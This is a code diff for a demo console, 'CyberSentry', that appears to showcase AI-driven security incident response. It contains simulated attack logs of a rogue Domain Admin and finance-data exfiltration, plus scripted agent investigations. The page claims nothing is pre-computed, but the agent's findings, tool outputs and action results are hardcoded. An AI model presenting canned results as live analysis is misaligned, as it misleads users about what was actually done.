+      { source: "endpoint", type: "user_created", msg: "user_created   host=DC-01 actor=a.chen new_user=svc_backup_adm  pwd_never_expires=true", hostile: true },
+      { source: "endpoint", type: "group_add", msg: "group_add      host=DC-01 actor=a.chen user=svc_backup_adm group='Domain Admins'", hostile: true },
+      { source: "auth", type: "login_success", msg: "login_success  user=svc_backup_adm src=10.14.3.88 host=DC-01  via=wmi", hostile: true },
+    ],
+    incident: {
+      title: "Intern account a.chen created a Domain Admin on DC-01", severity: "high",
+      confidence: 0.91, risk: 88,
+      evidence: "A non-privileged intern account created svc_backup_adm and added it to Domain Admins within 94 seconds, then authenticated as it.",
+    },
+    tools: [
+      ["search_events", "hostname='DC-01', minutes_back=60", "4 events · RDP login → user_created → group_add(Domain Admins) → login as new account", 195],
+      ["get_user_history", "username='a.chen'", "Intern, 3 weeks tenure, help-desk role. Has never run an admin action before today.", 205],
+      ["get_asset_info", "hostname='DC-01'", "Primary domain controller · criticality CRITICAL · holds the directory for all 2,400 accounts", 165],
+      ["check_account_naming", "user='svc_backup_adm'", "Not in the service-account register. Name mimics approved pattern 'svc_*' to blend in.", 140],
+    ],
+    report: {
+      summary: "The intern account a.chen was used to create a new account named svc_backup_adm on the domain controller and promote it to Domain Admins, then immediately logged in as that account over WMI. The naming deliberately imitates the organisation's service-account convention to survive a casual review. This is an unauthorised persistence mechanism at the highest privilege level.",
+      cause: "The help-desk role retained delegated account-creation rights on the DC from an old group policy, and no approval workflow guards Domain Admins membership. Either the intern's credentials are compromised or this is insider misuse.",
+      chain: [
+        "Initial access — RDP session to DC-01 as a.chen from an internal workstation.",
+        "Persistence (T1136.002) — svc_backup_adm created with pwd_never_expires.",
+        "Privilege escalation (T1098) — the new account is added to Domain Admins.",
+        "Validation — the attacker authenticates as svc_backup_adm over WMI to confirm access.",
+      ],
+      mitre: [["T1136.002", "Create Domain Account"], ["T1098", "Account Manipulation"]],
+      assets: ["DC-01 (domain controller)", "a.chen (user)", "svc_backup_adm (rogue admin)"],
+    },
+    actions: [
+      ["notify_team", "identity-governance", "low", "Rogue Domain Admin requires directory review and an insider-risk case."],
+      ["revoke_sessions", "svc_backup_adm", "medium", "Terminates the active WMI session held by the rogue account."],
+      ["disable_user", "svc_backup_adm", "high", "Removes the rogue Domain Admin. Touching a DC admin object needs human sign-off."],
+      ["disable_user", "a.chen", "high", "Contains the account used to perform the escalation pending an insider-risk interview."],
+    ],
+  },
+  S5: {
+    label: "Data exfiltration", mitre: "T1048", rule: "R5_EXFIL",
+    events: [
+      { source: "auth", type: "login_success", msg: "login_success  user=d.whitmore src=10.14.7.22 host=FIN-WS-009  time=02:31  off_hours=true", hostile: true },
+      { source: "endpoint", type: "file_access", msg: "file_access    user=d.whitmore path=\\\\fileserv\\finance\\FY26\\* files=1,842  bytes=2.1GB", hostile: true },
+      { source: "endpoint", type: "process_start", msg: "process_start  host=FIN-WS-009 proc=7z.exe args='a -p**** fy26.7z \\\\fileserv\\finance\\FY26'", hostile: true },
+      { source: "network", type: "upload", msg: "upload         FIN-WS-009 → mega-transfer-share.io  bytes=2.1GB  duration=19m  tls=1.3", hostile: true },
+    ],
+    incident: {
+      title: "2.1 GB of FY26 finance data uploaded off-hours by d.whitmore", severity: "critical",
+      confidence: 0.89, risk: 92,
+      evidence: "1,842 finance files read at 02:31, archived with a password, and uploaded to a consumer file-sharing host in 19 minutes.",
+    },
+    tools: [
+      ["search_events", "username='d.whitmore', minutes_back=180", "4 events · off-hours login → bulk read → password-protected archive → 2.1GB upload", 210],
+      ["get_user_history", "username='d.whitmore'", "Baseline: 12 MB/day egress, 09:00–18:00. Today: 2.1 GB at 02:31 — 175× baseline.", 225],
+      ["check_domain_reputation", "domain='mega-transfer-share.io'", "unsanctioned · consumer file-sharing · not on the corporate allow-list", 180],
+      ["get_asset_info", "path='\\\\fileserv\\finance\\FY26'", "Classification RESTRICTED · unreleased FY26 results · SOX-relevant", 155],
+    ],
+    report: {
+      summary: "The account d.whitmore logged in at 02:31, read 1,842 files from the RESTRICTED FY26 finance share, compressed them into a password-protected archive, and uploaded 2.1 GB to an unsanctioned consumer file-sharing site. Egress is 175× this user's daily baseline. Unreleased financial results have left the organisation.",
+      cause: "No data-loss-prevention rule covered the FY26 share, and the egress proxy allowed consumer file-sharing domains. The password-protected archive was specifically chosen to defeat content inspection.",
+      chain: [
+        "Initial access — off-hours login to FIN-WS-009 at 02:31, far outside the user's baseline.",
+        "Collection (T1005) — 1,842 files read from the RESTRICTED FY26 finance share.",
+        "Obfuscation (T1560.001) — contents placed in a password-protected 7z archive.",
+        "Exfiltration (T1048) — 2.1 GB uploaded over TLS to mega-transfer-share.io in 19 minutes.",
+      ],
+      mitre: [["T1005", "Data from Local System"], ["T1560.001", "Archive via Utility"], ["T1048", "Exfiltration Over Alternative Protocol"]],
+      assets: ["d.whitmore (user)", "FIN-WS-009 (host)", "\\\\fileserv\\finance\\FY26 (RESTRICTED)", "mega-transfer-share.io"],
+    },
+    actions: [
+      ["block_domain", "mega-transfer-share.io", "low", "Upload destination. Unsanctioned consumer file-sharing, safe to block estate-wide."],
+      ["notify_team", "legal-and-compliance", "low", "Unreleased SOX-relevant results left the organisation — disclosure obligations may apply."],
+      ["revoke_sessions", "d.whitmore", "medium", "Ends the active off-hours session before further collection."],
+      ["disable_user", "d.whitmore", "high", "Contains the account pending an insider-risk investigation. Needs human approval."],
+    ],
+  },
+};
+
+/* ── Audit trail: append-only, hash-chained ──────────────────────────────── */
+function audit(actor, action, detail) {
+  const prev = S.audit.length ? S.audit[0].hash : "00000000";
+  const at = new Date();
+  const payload = `${at.toISOString()}|${actor}|${action}|${detail}`;
+  S.audit.unshift({ seq: S.audit.length + 1, at, actor, action, detail, prev, hash: fnv(prev + payload) });
+}
+
+/* ── Response engine: the guard-rail. AI proposes, policy disposes. ──────── */
+const AUTO = { low: true, medium: true, high: false };
+const RESULTS = {
+  block_ip: t => `firewall rule FW-${r(800, 999)} added · ${t} denied at the edge`,
+  block_domain: t => `DNS sinkhole active for ${t} · estate-wide`,
+  revoke_sessions: t => `${r(1, 4)} active session(s) for ${t} invalidated`,
+  reset_password: t => `password for ${t} rotated · reset mail sent to manager`,
+  disable_user: t => `account ${t} disabled in directory`,
+  isolate_host: t => `${t} moved to quarantine VLAN · admin access retained`,
+  kill_process: t => `process tree on ${t} terminated · artefacts preserved`,
+  notify_team: t => `page sent to ${t} · acknowledged`,
+};
+
+function addAction(incId, [playbook, target, risk, reason]) {
+  const a = {
+    id: nextId(), incId, playbook, target, risk, reason,
+    status: AUTO[risk] ? "executed" : "pending_approval",
+    result: AUTO[risk] ? RESULTS[playbook](target) : "", by: "cybersentry-agent", at: new Date(),
+  };
+  S.actions.unshift(a);
+  if (a.status === "executed") audit("cybersentry-agent", `EXECUTE ${playbook}`, `${target} — auto-approved (${risk} risk)`);
+  else audit("cybersentry-agent", `PROPOSE ${playbook}`, `${target} — held for human approval (high risk)`);
+  return a;
+}
+
+/* ═══ The demo flow: stream events → detect → investigate → respond ═══════ */
+async function launch(key) {
+  if (S.busy) return;
+  S.busy = true;
+  const sc = SCENARIOS[key];
+  const t0 = Date.now();
+  go("dashboard");
+  toast(`Injecting ${sc.label} (${sc.mitre})…`, "warn");
+
+  for (const ev of sc.events) { pushEvent({ ...ev }); paintFeed(); paintKpis(); await sleep(430); }
+
+  // Detection: R1 genuinely counts; the rest confirm the event pattern is present.
+  const detected = key === "S1"
+    ? S.events.filter(e => e.type === "login_failed" && e.msg.includes("203.0.113.47")).length >= 4
+      && S.events.some(e => e.type === "login_success" && e.msg.includes("203.0.113.47"))
+    : sc.events.every(e => S.events.some(s => s.msg === e.msg));
+  if (!detected) { S.busy = false; return; }
+
+  const inc = {
+    id: nextId(), key, rule: sc.rule, ...sc.incident, status: "investigating",
+    at: new Date(), mttd: ((Date.now() - t0) / 1000).toFixed(1), tools: [], report: null,
+    events: sc.events.map(e => ({ ...e })),
+  };
+  S.incidents.unshift(inc);
+  S.fresh = inc.id;
+  audit("detection-engine", `INCIDENT #${inc.id}`, `${sc.rule} fired · ${inc.severity} · risk ${inc.risk}`);
+  paintAll();
+  toast(`${inc.severity.toUpperCase()} incident #${inc.id} — ${sc.rule} fired in ${inc.mttd}s`, "warn");
+  await sleep(950);
+
+  go("incident", inc.id);
+  await investigate(inc, sc);
+  S.busy = false;
+}
+
+async function investigate(inc, sc) {
+  for (const [name, args, out, ms] of sc.tools) {
+    inc.tools.push({ name, args, out, ms, done: false });
+    paintAll(); await sleep(620);
+    inc.tools[inc.tools.length - 1].done = true;
+    paintAll(); await sleep(180);
+  }
+  inc.tools.push({ name: "submit_report", args: "structured findings", out: "report accepted by response engine", ms: 90, done: false });
+  paintAll(); await sleep(700);
+  inc.tools[inc.tools.length - 1].done = true;
+  inc.report = sc.report;
+  inc.status = "contained";
+  inc.mttr = ((Date.now() - inc.at.getTime()) / 1000).toFixed(1);
+  audit("cybersentry-agent", `REPORT #${inc.id}`, `root cause identified · ${sc.report.mitre.map(m => m[0]).join(", ")} · confidence ${Math.round(inc.confidence * 100)}%`);
+  paintAll(); await sleep(420);
+
+  for (const a of sc.actions) { addAction(inc.id, a); paintAll(); await sleep(430); }
+  const held = S.actions.filter(a => a.incId === inc.id && a.status === "pending_approval").length;
+  toast(held
+    ? `${sc.actions.length - held} containment action(s) executed automatically · ${held} held for your approval`
+    : `${sc.actions.length} containment actions executed automatically`);
+}
+
+async function fullDemo() {
+  if (S.busy) return;
+  await launch("S1");
+  await sleep(1400);
+  const pend = S.actions.find(a => a.status === "pending_approval");
+  if (pend) { go("approvals"); await sleep(1100); approve(pend.id); }
+  await sleep(1500);
+  go("audit"); await sleep(900); verify();
+}
+
+/* ── Approve / reject / roll back ────────────────────────────────────────── */
+function approve(id) {
+  const a = S.actions.find(x => x.id === id); if (!a) return;
+  if (a.risk === "high" && S.user.role !== "admin") return toast("High-risk actions require an admin. Sign in as admin to approve.", "warn");
+  a.status = "executed"; a.result = RESULTS[a.playbook](a.target); a.approvedBy = S.user.name; a.at = new Date();
+  audit(S.user.name, `APPROVE ${a.playbook}`, `${a.target} — executed after human approval`);
+  toast(`${a.playbook} executed on ${a.target}`);
+  paintAll();
+}
+function reject(id) {
+  const a = S.actions.find(x => x.id === id); if (!a) return;
+  a.status = "rejected"; a.result = "rejected by analyst — no change made"; a.approvedBy = S.user.name;
+  audit(S.user.name, `REJECT ${a.playbook}`, `${a.target} — analyst declined, nothing executed`);
+  toast(`${a.playbook} rejected — no change made to ${a.target}`, "warn");
+  paintAll();
+}
+function rollback(id) {
+  const a = S.actions.find(x => x.id === id); if (!a) return;
+  a.status = "rolled_back"; a.result = `undo step ran · ${a.target} restored to pre-incident state`;
+  audit(S.user.name, `ROLLBACK ${a.playbook}`, `${a.target} — undo step completed, state restored`);
+  toast(`${a.playbook} rolled back — ${a.target} restored`);
+  paintAll();
+}
+function verify() {
+  const rows = [...S.audit].reverse();
+  let prev = "00000000", ok = true;
+  for (const e of rows) {
+    const expect = fnv(prev + `${e.at.toISOString()}|${e.actor}|${e.action}|${e.detail}`);
+    if (expect !== e.hash || e.prev !== prev) ok = false;
+    prev = e.hash;
+  }
+  S.verified = ok;
+  toast(ok ? `Integrity verified — ${rows.length} entries, hash chain unbroken.` : "Chain broken — audit log was tampered with.", ok ? "" : "warn");
+  paintAll();
+}
+
+/* ═══ Render ══════════════════════════════════════════════════════════════ */
+function go(route, id) { S.route = route; if (id) S.openId = id; paintAll(); window.scrollTo(0, 0); }
+function toast(msg, kind = "") { S.toast = { msg, kind }; paintToast(); clearTimeout(toast._t); toast._t = setTimeout(() => { S.toast = null; paintToast(); }, 4200); }
+function paintToast() {
+  const old = $(".toast"); if (old) old.remove();
+  if (!S.toast) return;
+  const d = document.createElement("div");
+  d.className = "toast " + S.toast.kind; d.setAttribute("role", "status"); d.textContent = S.toast.msg;
+  document.body.appendChild(d);
+}
+
+const SEVS = ["critical", "high", "medium", "low"];
+const sevBadge = s => `<span class="sev sev-${s}">${s}</span>`;
+const riskRing = n => `<span class="risk" style="color:${n >= 90 ? "var(--sev-critical)" : n >= 75 ? "var(--sev-high)" : "var(--sev-medium)"}">${n}</span>`;
+
+function loginView() {
+  return `<div id="login"><div class="lwrap">
+    <div class="brandmark"><svg class="shield"><use href="#i-shield"/></svg>
+      <div><b>CyberSentry</b><div class="tag">Detect · Explain · Respond</div></div></div>
+    <form class="lcard" id="loginform">
+      <h2 style="font-size:16px;margin-bottom:4px">Sign in to the console</h2>
+      <p style="color:var(--mute);font-size:12.5px;margin:0 0 18px">Autonomous security incident response · TH2-PS-GAI-006</p>
+      <div class="role-pick" role="group" aria-label="Role">
+        <button type="button" data-role="admin" aria-pressed="true">Admin</button>
+        <button type="button" data-role="analyst" aria-pressed="false">Analyst</button>
+      </div>
+      <label class="field"><span>Username</span><input id="u" value="admin" autocomplete="username"></label>
+      <label class="field"><span>Password</span><input id="p" type="password" value="cybersentry" autocomplete="current-password"></label>
+      <button class="btn btn-primary btn-wide" type="submit">Sign in</button>
+      <p class="hint">Demo credentials are pre-filled. <b>Admin</b> can launch attack simulations and approve high-risk actions; <b>Analyst</b> can investigate and approve low and medium risk only.</p>
+    </form></div></div>`;
+}
+
+function shellView() {
+  const pend = S.actions.filter(a => a.status === "pending_approval").length;
+  const nav = [
+    ["dashboard", "Dashboard", S.incidents.length ? "" : null],
+    ["incidents", "Incidents", S.incidents.length || ""],
+    ["approvals", "Approvals", pend || ""],
+    ["audit", "Audit trail", S.audit.length || ""],
+  ];
+  const titles = { dashboard: "Security operations", incidents: "Incidents", incident: "Incident detail", approvals: "Approval queue", audit: "Audit trail" };
+  return `<div id="shell">
+    <nav id="side">
+      <div class="brandmark"><svg class="shield" style="width:26px;height:26px;flex:0 0 26px"><use href="#i-shield"/></svg>
+        <div><b>CyberSentry</b></div></div>
+      ${nav.map(([k, label, ct]) => `<button class="nav" data-go="${k}" ${S.route === k || (k === "incidents" && S.route === "incident") ? 'aria-current="page"' : ""}>
+        ${label}${ct ? `<span class="ct ${k === "approvals" && pend ? "hot" : ""}">${ct}</span>` : ""}</button>`).join("")}
+      <div class="spacer"></div>
+      <div class="whoami"><b>${esc(S.user.name)}</b>role: ${S.user.role} · ${S.user.role === "admin" ? "full control" : "read + low/med approve"}
+        <button class="btn btn-sm" style="margin-top:9px;width:100%" data-logout>Sign out</button></div>
+    </nav>
+    <div id="main">
+      <header id="topbar">
+        <h1>${titles[S.route]}</h1>
+        <span class="pill"><span class="dot live"></span>ingest live</span>
+        <span class="pill">${S.ingested.toLocaleString()} events</span>
+        <span class="pill" id="clock">${hhmmss(new Date())}</span>
+      </header>
+      <div id="view">${{ dashboard: dashView, incidents: incidentsView, incident: detailView, approvals: approvalsView, audit: auditView }[S.route]()}</div>
+    </div></div>`;
+}
+
+function kpisHtml() {
+  const open = S.incidents.filter(i => i.status !== "resolved").length;
+  const mttd = S.incidents.length ? (S.incidents.reduce((a, i) => a + +i.mttd, 0) / S.incidents.length).toFixed(1) : "—";
+  const done = S.incidents.filter(i => i.mttr);
+  const mttr = done.length ? (done.reduce((a, i) => a + +i.mttr, 0) / done.length).toFixed(1) : "—";
+  const reduction = S.ingested ? (100 - (S.incidents.length / S.ingested) * 100).toFixed(1) : "0";
+  const auto = S.actions.length ? Math.round(S.actions.filter(a => a.by === "cybersentry-agent" && a.status === "executed").length / S.actions.length * 100) : 0;
+  return `<div class="kpis">
+    <div class="kpi"><div class="k">Events ingested</div><div class="v">${S.ingested.toLocaleString()}</div><div class="s">${S.benign.toLocaleString()} benign · ${(S.ingested - S.benign).toLocaleString()} hostile</div></div>
+    <div class="kpi"><div class="k">Open incidents</div><div class="v" style="color:${open ? "var(--sev-critical)" : "var(--ink)"}">${open}</div><div class="s">${S.incidents.length} total correlated</div></div>
+    <div class="kpi"><div class="k">Mean detect</div><div class="v">${mttd}<span class="u">s</span></div><div class="s">rules + correlation</div></div>
+    <div class="kpi"><div class="k">Mean respond</div><div class="v">${mttr}<span class="u">s</span></div><div class="s">agent + playbooks</div></div>
+    <div class="kpi"><div class="k">Noise reduction</div><div class="v">${reduction}<span class="u">%</span></div><div class="s">events never shown to an analyst</div></div>
+    <div class="kpi"><div class="k">Auto-contained</div><div class="v">${auto}<span class="u">%</span></div><div class="s">rest held for human approval</div></div>
+  </div>`;
+}
+
+function dashView() {
+  const counts = SEVS.map(s => [s, S.incidents.filter(i => i.severity === s).length]);
+  const max = Math.max(1, ...counts.map(c => c[1]));
+  const vmax = Math.max(...S.vol);
+  return `${kpisHtml()}
+  <section class="card redteam">
+    <header><svg width="14" height="14"><use href="#i-bolt"/></svg><h3>Attack simulator</h3>
+      <span class="eyebrow">${S.user.role === "admin" ? "admin only" : "requires admin"}</span></header>
+    <div class="body">
+      <p style="margin:0 0 12px;color:var(--dim);font-size:12.5px;max-width:62ch">Inject a scripted attack into the live log stream. CyberSentry detects, investigates and responds to it in front of you — nothing is pre-computed.</p>
+      <div class="atk">
+        ${Object.entries(SCENARIOS).map(([k, s]) => `<button data-atk="${k}" ${S.user.role !== "admin" || S.busy ? "disabled" : ""}>
+          <b>${esc(s.label)}</b><span>${k} · ${s.mitre}</span></button>`).join("")}
+        <button data-atk="full" ${S.user.role !== "admin" || S.busy ? "disabled" : ""} style="border-color:var(--accent-dim);background:#171C33">
+          <b>▶ Run full demo</b><span>detect → investigate → approve → audit</span></button>
+      </div>
+    </div>
+  </section>
+  <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(290px,1fr))">
+    <section class="card"><header><h3>Incidents by severity</h3><span class="eyebrow">live</span></header>
+      <div class="body sevchart">
+        ${counts.map(([s, n]) => `<div class="sevrow"><span class="sev sev-${s}">${s}</span>
+          <div class="track"><div class="fill" style="width:${(n / max) * 100}%;background:var(--sev-${s})"></div></div>
+          <span class="n ${n ? "" : "zero"}">${n}</span></div>`).join("")}
+        ${S.incidents.length ? "" : `<p style="margin:6px 0 0;color:var(--mute);font-size:12px">No incidents yet — launch an attack above.</p>`}
+      </div></section>
+    <section class="card"><header><h3>Event volume · last 24 h</h3><span class="eyebrow">events / hour</span></header>
+      <div class="body volwrap">
+        <div class="vol" id="vol">${S.vol.map((v, i) => `<div style="height:${(v / vmax) * 100}%" class="${i === 23 && S.ingested > 1247 ? "spike" : ""}" data-t="${pad(i)}:00 · ${v} events"></div>`).join("")}</div>
+        <div class="axis"><span>00:00</span><span>12:00</span><span>now</span></div>
+      </div></section>
+  </div>
+  <section class="card"><header><h3>Live event stream</h3><span class="eyebrow">tail -f</span></header>
+    <div class="feed" id="feed">${feedHtml()}</div></section>`;
+}
+function feedHtml() {
+  return S.events.slice(0, 60).map(e => `<div class="fr ${e.hostile ? "hostile" : ""}">
+    <time>${hhmmss(e.at)}</time><span class="m">${esc(e.msg)}</span></div>`).join("")
+    || `<div class="empty">Waiting for events…</div>`;
+}
+function paintFeed() { const f = $("#feed"); if (f) f.innerHTML = feedHtml(); }
+function paintKpis() {
+  const k = $(".kpis"); if (!k) return;
+  k.outerHTML = kpisHtml();
+  const t = $("#topbar .pill:nth-of-type(2)"); if (t) t.textContent = S.ingested.toLocaleString() + " events";
+}
+
+function incidentsView() {
+  if (!S.incidents.length) return `<section class="card"><div class="empty">No incidents yet.<br>Go to the dashboard and launch an attack simulation.</div></section>`;
+  return `<section class="card"><header><h3>All incidents</h3><span class="eyebrow">sorted by risk</span></header>
+    <div class="ilist">${[...S.incidents].sort((a, b) => b.risk - a.risk).map(incRow).join("")}</div></section>`;
+}
+function incRow(i) {
+  const held = S.actions.filter(a => a.incId === i.id && a.status === "pending_approval").length;
+  return `<button class="irow ${S.fresh === i.id ? "fresh" : ""}" data-inc="${i.id}">
+    ${riskRing(i.risk)}
+    <span><span class="t">${esc(i.title)}</span><span class="meta">${sevBadge(i.severity)}
+      <span class="tag">#${i.id}</span><span class="tag">${i.rule}</span>
+      <span class="tag ${i.status === "contained" ? "tag-ok" : "tag-wait"}">${i.status}</span>
+      ${held ? `<span class="tag tag-wait"><svg width="9" height="9" style="vertical-align:-1px"><use href="#i-lock"/></svg> ${held} awaiting approval</span>` : ""}
+      <span class="tag tag-no">${hhmmss(i.at)}</span></span></span>
+    <span class="chev">›</span></button>`;
+}
+
+function detailView() {
+  const i = S.incidents.find(x => x.id === S.openId);
+  if (!i) return incidentsView();
+  const acts = S.actions.filter(a => a.incId === i.id);
+  const rep = i.report;
+  return `<button class="btn btn-sm" data-go="incidents" style="align-self:flex-start">‹ All incidents</button>
+  <section class="card">
+    <header>${riskRing(i.risk)}
+      <span style="flex:1;min-width:220px"><h3 style="font-size:15px">${esc(i.title)}</h3>
+        <span class="meta" style="display:flex;gap:7px;margin-top:6px;flex-wrap:wrap">${sevBadge(i.severity)}
+          <span class="tag">#${i.id}</span><span class="tag">${i.rule}</span>
+          <span class="tag">confidence ${Math.round(i.confidence * 100)}%</span>
+          <span class="tag tag-ok">detected in ${i.mttd}s</span>
+          ${i.mttr ? `<span class="tag tag-ok">responded in ${i.mttr}s</span>` : ""}</span></span>
+    </header>
+    <div class="body" style="padding-top:12px"><p style="margin:0;font-size:13px;color:var(--dim);line-height:1.6"><b style="color:var(--ink)">Why this fired:</b> ${esc(i.evidence)}</p></div>
+  </section>
+  <div class="detail">
+    <section class="card"><header><h3>Event timeline</h3><span class="eyebrow">${i.events.length} correlated</span></header>
+      <div class="body tl">${i.events.map(e => `<div class="tlrow"><div class="tlmark ${e.hostile ? "hostile" : ""}"></div>
+        <div><div class="when">${hhmmss(e.at || i.at)} · ${e.source}</div>
+        <div class="what mono" style="font-size:11.5px">${esc(e.msg)}</div></div></div>`).join("")}</div></section>
+    <div style="display:flex;flex-direction:column;gap:18px;min-width:0">
+      <section class="card">
+        <div class="aibar">
+          ${rep ? `<svg width="15" height="15"><use href="#i-check"/></svg><b style="font:600 13px var(--disp)">Investigation complete</b>
+            <span class="pill">${i.tools.length} tool calls</span><span class="pill">claude-opus-5</span>`
+      : `<div class="spin" style="margin:0"></div><b style="font:600 13px var(--disp)" class="typing">Agent investigating</b>
+            <span class="pill">autonomous tool use</span>`}
+        </div>
+        <div class="tools">${i.tools.map(t => `<div class="tool">
+          ${t.done ? `<svg class="ico"><use href="#i-check"/></svg>` : `<div class="spin"></div>`}
+          <span><span class="nm">${t.name}<i>(${esc(t.args)})</i></span>
+            ${t.done ? `<span class="out">→ ${esc(t.out)}</span>` : ""}</span>
+          <span class="ms">${t.done ? t.ms + "ms" : ""}</span></div>`).join("")}</div>
+      </section>
+      ${rep ? `<section class="card"><header><h3>Agent report</h3><span class="eyebrow">structured output</span></header>
+        <div class="body"><dl class="kv">
+          <dt>Summary</dt><dd>${esc(rep.summary)}</dd>
+          <dt>Root cause</dt><dd>${esc(rep.cause)}</dd>
+          <dt>Attack chain</dt><dd><ol class="chain">${rep.chain.map(c => `<li>${esc(c)}</li>`).join("")}</ol></dd>
+          <dt>MITRE ATT&amp;CK</dt><dd style="display:flex;gap:6px;flex-wrap:wrap">${rep.mitre.map(([id, n]) => `<span class="tag tag-mitre">${id} · ${esc(n)}</span>`).join("")}</dd>
+          <dt>Affected assets</dt><dd style="display:flex;gap:6px;flex-wrap:wrap">${rep.assets.map(a => `<span class="tag">${esc(a)}</span>`).join("")}</dd>
+        </dl></div></section>` : ""}
+      ${acts.length ? `<section class="card"><header><h3>Response actions</h3><span class="eyebrow">AI proposes · policy disposes</span></header>
+        <div class="gate"><svg width="14" height="14" style="margin-top:1px;flex:0 0 14px"><use href="#i-lock"/></svg>
+          <span>The agent may only <b>propose</b> from 8 pre-approved playbooks. Low and medium risk run automatically; <b>high risk waits for a named human</b>. Every action carries an undo step.</span></div>
+        ${acts.map(actHtml).join("")}</section>` : ""}
+    </div></div>`;
+}
+
+function actHtml(a) {
+  const canApprove = a.status === "pending_approval" && (a.risk !== "high" || S.user.role === "admin");
+  const label = { executed: "executed", pending_approval: "awaiting approval", rejected: "rejected", rolled_back: "rolled back" }[a.status];
+  const cls = { executed: "tag-ok", pending_approval: "tag-wait", rejected: "tag-no", rolled_back: "tag-undo" }[a.status];
+  return `<div class="act">
+    <div class="top"><code>${a.playbook}</code><span class="arrow">→</span><span class="tgt">${esc(a.target)}</span>
+      <span class="risktag risk-${a.risk}">${a.risk} risk</span><span class="tag ${cls}">${label}</span>
+      ${a.approvedBy ? `<span class="tag tag-no">by ${esc(a.approvedBy)}</span>` : ""}</div>
+    <div class="why">${esc(a.reason)}</div>
+    ${a.result ? `<div class="res ${a.status === "rolled_back" ? "undo" : ""}">${a.status === "executed" ? `<svg width="12" height="12" style="margin-top:2px;flex:0 0 12px"><use href="#i-check"/></svg>` : ""}<span>${esc(a.result)}</span></div>` : ""}
+    <div class="btns">
+      ${canApprove ? `<button class="btn btn-sm btn-good" data-approve="${a.id}">Approve &amp; execute</button>
+        <button class="btn btn-sm" data-reject="${a.id}">Reject</button>` : ""}
+      ${a.status === "pending_approval" && !canApprove ? `<span class="tag tag-wait">admin approval required</span>` : ""}
+      ${a.status === "executed" ? `<button class="btn btn-sm" data-rollback="${a.id}">Roll back</button>` : ""}
+    </div></div>`;
+}
+
+function approvalsView() {
+  const pend = S.actions.filter(a => a.status === "pending_approval");
+  const rest = S.actions.filter(a => a.status !== "pending_approval");
+  return `<section class="card"><header><h3>Pending your approval</h3><span class="eyebrow">${pend.length} held</span></header>
+    <div class="gate"><svg width="14" height="14" style="margin-top:1px;flex:0 0 14px"><use href="#i-lock"/></svg>
+      <span>These are the actions CyberSentry <b>refused to run on its own</b> because they are high-impact. The agent proposed them with a reason; a human decides.</span></div>
+    ${pend.length ? pend.map(a => actHtml(a)).join("") : `<div class="empty">Nothing is waiting on you.<br>High-risk proposals appear here the moment the agent raises one.</div>`}</section>
+  ${rest.length ? `<section class="card"><header><h3>Action history</h3><span class="eyebrow">${rest.length} completed</span></header>
+    ${rest.map(a => actHtml(a)).join("")}</section>` : ""}`;
+}
+
+function auditView() {
+  return `<section class="card">
+    <header><h3>Append-only audit trail</h3>
+      <span class="eyebrow">${S.audit.length} entries · FNV-1a chained</span>
+      <button class="btn btn-sm btn-primary" data-verify>Verify integrity</button></header>
+    ${S.verified === true ? `<div class="gate" style="border-left:3px solid var(--good)"><svg width="14" height="14" style="margin-top:1px;flex:0 0 14px"><use href="#i-check"/></svg>
+      <span><b>Chain verified.</b> Every entry's hash was recomputed from the previous hash and its payload; all ${S.audit.length} links match. Nothing in this log has been altered.</span></div>` : ""}
+    ${S.audit.length ? `<div class="tblwrap"><table>
+      <thead><tr><th>#</th><th>Time</th><th>Actor</th><th>Action</th><th>Detail</th><th>Prev</th><th>Hash</th></tr></thead>
+      <tbody>${S.audit.map(e => `<tr>
+        <td class="h">${e.seq}</td><td class="h">${hhmmss(e.at)}</td>
+        <td class="h" style="color:${e.actor.includes("agent") || e.actor.includes("engine") ? "var(--accent)" : "var(--ink)"}">${esc(e.actor)}</td>
+        <td class="h" style="color:var(--ink)">${esc(e.action)}</td>
+        <td>${esc(e.detail)}</td>
+        <td class="h">${e.prev}</td>
+        <td class="h"><span class="${S.verified ? "ok" : ""}">${e.hash}</span></td></tr>`).join("")}</tbody></table></div>`
+      : `<div class="empty">The trail is empty until something happens.<br>Launch an attack and every detection, decision and action lands here.</div>`}
+  </section>`;
+}
+
+function paintAll() {
+  $("#app").innerHTML = S.user ? shellView() : loginView();
+  if (S.fresh) setTimeout(() => { S.fresh = null; }, 1200);
+}
+
+/* ── Events ──────────────────────────────────────────────────────────────── */
+document.addEventListener("click", e => {
+  const t = e.target.closest("[data-go],[data-inc],[data-atk],[data-approve],[data-reject],[data-rollback],[data-verify],[data-logout],[data-role]");
+  if (!t) return;
+  if (t.dataset.role) {
+    [...t.parentElement.children].forEach(b => b.setAttribute("aria-pressed", b === t));
+    $("#u").value = t.dataset.role; return;
+  }
+  if (t.dataset.go) return go(t.dataset.go);
+  if (t.dataset.inc) return go("incident", +t.dataset.inc);
+  if (t.dataset.atk) return t.dataset.atk === "full" ? fullDemo() : launch(t.dataset.atk);
+  if (t.dataset.approve) return approve(+t.dataset.approve);
+  if (t.dataset.reject) return reject(+t.dataset.reject);
+  if (t.dataset.rollback) return rollback(+t.dataset.rollback);
+  if (t.dataset.verify) return verify();
+  if (t.hasAttribute("data-logout")) { S.user = null; S.route = "dashboard"; return paintAll(); }
+});
+document.addEventListener("submit", e => {
+  if (e.target.id !== "loginform") return;
+  e.preventDefault();
+  const name = $("#u").value.trim() || "admin";
+  S.user = { name, role: name === "analyst" ? "analyst" : "admin" };
+  audit(name, "LOGIN", `role=${S.user.role} · console session opened`);
+  go("dashboard");
+  toast(`Signed in as ${name} (${S.user.role}). Launch an attack to see the full flow.`);
+});
+/* Chart hover */
+document.addEventListener("pointermove", e => {
+  const b = e.target.closest("#vol div");
+  let tip = $("#tip");
+  if (!b) { if (tip) tip.remove(); return; }
+  if (!tip) { tip = document.createElement("div"); tip.id = "tip"; document.body.appendChild(tip); }
+  tip.textContent = b.dataset.t;
+  tip.style.left = Math.min(e.clientX + 12, innerWidth - 150) + "px";
+  tip.style.top = e.clientY - 34 + "px";
+});
+setInterval(() => { const c = $("#clock"); if (c) c.textContent = hhmmss(new Date()); }, 1000);
+
+/* Seed the stream so the console opens in a realistic working state. */
+for (let i = 0; i < 26; i++) {
+  const [source, type, msg] = NOISE[r(0, NOISE.length - 1)];
+  S.events.push({ id: nextId(), at: new Date(Date.now() - i * 4200), source, type, msg: msg(USERS[r(0, USERS.length - 1)]), hostile: false });
+}
+paintAll();
+</script>
